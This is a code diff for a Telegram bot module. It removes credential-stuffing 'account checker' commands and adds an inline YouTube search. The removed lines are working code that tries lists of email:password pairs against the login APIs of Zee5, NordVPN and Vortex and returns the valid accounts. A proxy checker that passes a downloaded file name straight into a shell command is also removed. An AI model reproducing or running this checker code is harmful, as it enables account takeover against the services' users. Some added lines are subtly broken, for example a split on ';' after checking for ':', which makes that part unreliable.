@@ -1,341 +1,18 @@
 import os
 import telethon
-import requests
-from telethon import TelegramClient, events, functions, Button
 from telethon.tl.functions.users import GetFullUserRequest
+import re
+import urllib
+from math import ceil
 
-from Evie import tbot, OWNER_ID, CMD_HELP
-from youtube_search import YoutubeSearch
+import requests
+from telethon import Button, custom, events, functions
+from youtubesearchpython import SearchVideos
+
+
+
+from Evie import tbot, OWNER_ID, CMD_HELP, Ubot, StartTime
 from Evie.events import register
-sedpath = "./roseloverx/"
-if not os.path.isdir(sedpath):
-    os.makedirs(sedpath)
-
-temp = './'
-
-data = {
-    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
-    "Content-Length": "55",
-    "Accept-Encoding": "gzip",
-}
-
-data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}
-
-
-face = {
-	"Accept-Encoding": "gzip, deflate, br",
-	"Accept-Language": "en-US,en;q=0.9",
-	"Connection": "keep-alive",
-	"Content-Length": "136",
-	"Content-Type": "application/json;charset=UTF-8",
-	"Host": "userauth.voot.com",
-	"Origin": "https://www.voot.com",
-	"Referer": "https://www.voot.com",
-	"Sec-Fetch-Dest": "empty",
-	"Sec-Fetch-Mode": "cors",
-	"Sec-Fetch-Site": "same-site",
-	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.66"
-}
-
-
-@register(pattern="^/proxy$")
-async def Devsexpo(event):
-    ok = await event.reply(
-        "Checking Proxies Please Wait."
-    )
-    pablo = await event.get_reply_message()
-    if pablo == None:
-        await ok.edit('Reply To File')
-        return
-    escobar = await tbot.download_media(pablo.media, temp)
-    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
-    os.system(cmd)
-    file = open("goood.txt", "r")
-    Counter = 0
-    Content = file.read()
-    CoList = Content.split("\n")
-    for i in CoList:
-        if i:
-            Counter += 1
-    file.close()
-    if Counter <= 0:
-        await ok.edit(
-            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
-        )
-    elif Counter >= 1:
-        file1 = open("goood.txt", "a")
-        file1.write("\nChecked by MissEvie_Robot\n")
-        file1.close()
-        ok.delete()
-        await tbot.send_file(
-            event.chat_id,
-            "goood.txt",
-            caption=f"**Proxies Checked**\n**Good Proxies: ** {Counter}\n\n**Checked by MissEvie_Robot",
-        )
-        os.remove(escobar)
-        os.remove("goood.txt")
-
-
-
-
-@register(pattern="^/zee5 ?(.*)")
-async def Devsexpo(event):
-    input_str = event.pattern_match.group(1)
-    if input_str == "combo":
-        ok = await event.reply(
-            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
-        )
-        stark_dict = []
-        hits_dict = []
-        hits = 0
-        bads = 0
-        lol = await event.get_reply_message()
-        if lol == None:
-            await ok.edit('Reply To File')
-            return
-        starky = await tbot.download_media(lol.media, temp)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if not event.sender_id == OWNER_ID:
-          if len(stark_dict) > 30:
-            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
-            return
-        os.remove(starky)
-        for i in stark_dict:
-            starkm = i.split(":")
-            email = starkm[0]
-            password = starkm[1]
-            try:
-                meke = requests.get(
-                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
-                ).json()
-            except BaseException:
-                meke = None
-            if meke.get("token"):
-                hits += 1
-                hits_dict.append(f"{email}:{password}")
-            else:
-                bads += 1
-        if len(hits_dict) == 0:
-            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
-            return
-        with open("hits.txt", "w") as hitfile:
-            for s in hits_dict:
-                hitfile.write(s + " | @MissEvie_Robot\n")
-        ok.delete()
-        await tbot.send_file(
-            event.chat_id,
-            "hits.txt",
-            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
-        )
-        os.remove("hits.txt")
-    else:
-        if input_str:
-            if ":" in input_str:
-                stark = input_str.split(":", 1)
-            else:
-                await event.reply("**! No Lol, use email:pass Regex !**")
-                return
-        else:
-            await event.reply("**Give Combos To Check**")
-            return
-        email = stark[0]
-        password = stark[1]
-        meke = requests.get(
-            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
-        ).json()
-        beautifuln = f"""
-**Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Response:-** Invalid
-"""
-
-        beautiful = f"""
-**Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Response:-** Valid Account
-**Login Here**: www.zee5.com
-"""
-        if meke.get("token"):
-            await event.reply(beautiful)
-        else:
-            await event.reply(beautifuln)
-
-
-@register(pattern="^/nord ?(.*)")
-async def Devsexpo(event):
-    input_str = event.pattern_match.group(1)
-    if input_str == "combo":
-        ok = await event.reply(
-            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
-        )
-        stark_dict = []
-        hits_dict = []
-        hits = 0
-        bads = 0
-        lol = await event.get_reply_message()
-        if lol == None:
-            await event.reply('Reply To File')
-            return
-        starky = await tbot.download_media(lol.media, temp)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 30:
-            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
-            return
-        os.remove(starky)
-        for i in stark_dict:
-            starkm = i.split(":")
-            email = starkm[0]
-            password = starkm[1]
-            sedlyf = {"username": email, "password": password}
-            try:
-                meke = requests.post(
-                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
-                    headers=data,
-                    json=sedlyf,
-                ).json()
-            except BaseException:
-                meke = None
-            if meke.get("token"):
-                hits += 1
-                hits_dict.append(f"{email}:{password}")
-            else:
-                bads += 1
-        if len(hits_dict) == 0:
-            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
-            return
-        with open("hits.txt", "w") as hitfile:
-            for s in hits_dict:
-                hitfile.write(s + " | @MissEvie_Robot")
-        ok.delete()
-        await tbot.send_file(
-            event.chat_id,
-            "hits.txt",
-            caption=f"**!NORD HITS!** \n**Hits :** `{hits}` \n**Bad :** `{bads}`",
-        )
-        os.remove("hits.txt")
-    else:
-        if input_str:
-            if ":" in input_str:
-                stark = input_str.split(":", 1)
-            else:
-                await event.reply("**! No Lol, use email:pass Regex !**")
-                return
-        else:
-            await event.reply("**Give Combos To Check**")
-            return
-        email = stark[0]
-        password = stark[1]
-        sedlyf = {"username": email, "password": password}
-        meke = requests.post(
-            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
-            headers=data,
-            json=sedlyf,
-        ).json()
-        beautifuln = f"""
-**Checked Nord Account**
-**Combo:** {email}:{password}
-**Response:-** Invalid
-"""
-
-        beautiful = f"""
-**Checked Nord Account**
-**Combo:** {email}:{password}
-**Response:-** Valid Account
-**Login Here**: www.nordvpn.com
-"""
-        if meke.get("token"):
-            await event.reply(beautiful)
-        else:
-            await event.reply(beautifuln)
-
-
-@register(pattern="^/vortex ?(.*)")
-async def vortex(event):
-    input_str = event.pattern_match.group(1)
-    if input_str == "combo":
-        ok = await event.reply(
-            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
-        )
-        stark_dict = []
-        hits_dict = []
-        hits = 0
-        bads = 0
-        lol = await event.get_reply_message()
-        if lol == None:
-            await event.reply('Reply To File')
-            return
-        starky = await tbot.download_media(lol.media, temp)
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 20:
-            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
-            return
-        os.remove(starky)
-        for i in stark_dict:
-            starkm = i.split(":")
-            email = starkm[0]
-            password = starkm[1]
-            sedlyf = {"username": email, "password": password}
-            try:
-                meke = requests.post(
-                    url="https://vortex-api.gg/login", headers=data2, json=sedlyf
-                ).json()
-            except BaseException:
-                meke = None
-            if meke.get("token"):
-                hits += 1
-                hits_dict.append(f"{email}:{password}")
-            else:
-                bads += 1
-        if len(hits_dict) == 0:
-            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
-            return
-        with open("hits.txt", "w") as hitfile:
-            for s in hits_dict:
-                hitfile.write(s + " | @MissEvie_Bot")
-        ok.delete()
-        await tbot.send_file(
-            event.chat_id,
-            "hits.txt",
-            caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
-        )
-        os.remove("hits.txt")
-    else:
-        if input_str:
-            if ":" in input_str:
-                stark = input_str.split(":", 1)
-            else:
-                await event.reply("**! No Lol, use email:pass Regex !**")
-                return
-        else:
-            await event.reply("**Give Combos To Check**")
-            return
-        email = stark[0]
-        password = stark[1]
-        sedlyf = {"username": email, "password": password}
-        meke = requests.post(
-            url="https://vortex-api.gg/login", headers=data2, json=sedlyf
-        ).json()
-        beautifuln = f"""
-**Checked Vortex Account**
-**Combo:** {email}:{password}
-**Response:-** Invalid
-"""
-
-        beautiful = f"""
-**Checked Vortex Account**
-**Combo:** {email}:{password}
-**Response:-** Valid Account
-**Login Here**: www.vortex.gg
-"""
-        if meke.get("token"):
-            await event.reply(beautiful)
-        else:
-            await event.reply(beautifuln)
-
-from Evie import StartTime, tbot, ubot
 import datetime, time
 
 def get_readable_time(seconds: int) -> str:
@@ -471,24 +148,61 @@ async def _(event):
  except Exception as e:
       await event.reply(e)
 
-@register(pattern="^/search (.*)")
-async def yt(event):
- k = event.pattern_match.group(1)
- message = f"/search {k}"
- results = YoutubeSearch(message,max_results=3).to_dict()
- i = 0
- text = ""
- while i < 1:
-    text += f"Title - {results[i]['title']}\n"
-    text += f"Duration - {results[i]['duration']}\n"
-    text += f"Views - {results[i]['views']}\n"
-    text += f"Channel - {results[i]['channel']}\n"
-    text += f"https://youtube.com{results[i]['url_suffix']}\n\n"
-    i += 1
- await event.reply(
-                    reply,
-                    link_preview=True,
+# COPYRIGHT (C) 2021 BY LEGENDX22 AND PROBOYX
+# DO NOT REMOVE THIS LINES WE HAVE COPYRIGHT 🤨
+
+
+
+@tbot.on(events.InlineQuery(pattern=r"yt (.*)"))
+async def inline_id_handler(event: events.InlineQuery.Event):
+    builder = event.builder
+    k = event.pattern_match.group(1)
+    if ":" in k:
+         testinput,evlin = event.pattern_match.group(1).split(";")
+    else:
+         testinput = event.pattern_match.group(1)
+         evlin = 5
+    urllib.parse.quote_plus(testinput)
+    lund = event.sender_id
+    if lund == lund:
+        results = []
+        search = SearchVideos(f"{testinput}", offset=1, mode="dict", max_results=int(evlin))
+        mi = search.result()
+        moi = mi["search_result"]
+        if search == None:
+            resultm = builder.article(
+                title="No Results.",
+                description="Try Again With correct Spelling",
+                text="**No Matching Found**",
+                buttons=[
+                    [Button.switch_inline("Search Again", query="yt ", same_peer=True)],
+                ],
+            )
+            await event.answer([resultm])
+            return
+        for mio in moi:
+            mo = mio["link"]
+            thum = mio["title"]
+            proboyx = mio["id"]
+            thums = mio["channel"]
+            td = mio["duration"]
+            tw = mio["views"]
+            kekme = f"https://img.youtube.com/vi/{proboyx}/hqdefault.jpg"
+            okayz = f"**Title :** `{thum}` \n**Link :** {mo} \n**Channel :** `{thums}` \n**Views :** `{tw}` \n**Duration :** `{td}`"
+            hmmkek = f"Channel : {thums} \nDuration : {td} \nViews : {tw}"
+            results.append(
+                await event.builder.article(
+                    title=thum,
+                    description=hmmkek,
+                    text=okayz,
+                    buttons=Button.switch_inline(
+                        "Search Again", query="yt ", same_peer=True
+                    ),
                 )
+            )
+        await event.answer(results)
+
+
 
 
 file_help = os.path.basename(__file__)
@@ -500,13 +214,7 @@ __help__ = """
  - /music: sends the requested Music
  - /gey: get geyness
  - /shazam: gets info about the given audio
-**Help For Account Checker**
- - /zee5 <email:password> - Checks Zee5 
- - /zee5 combo - Reply To Combos File And Limit is 20.
- - /nord <email:password> - Checks One Account
- - /nord combo - Reply To Combos File And Limit is 20.
- - /vortex <email:password> - Checks One Account
- - /vortex combo - Reply To Combos File And Limit is 20.
- - /proxy - Reply To Proxy File Only, Check Your Proxies.
+ - Inline YouTube Search 
+**Syntax:** @MissEvie_Robot yt <query>:<max results{optional}>
 """
 CMD_HELP.update({file_helpo: [file_helpo, __help__]})
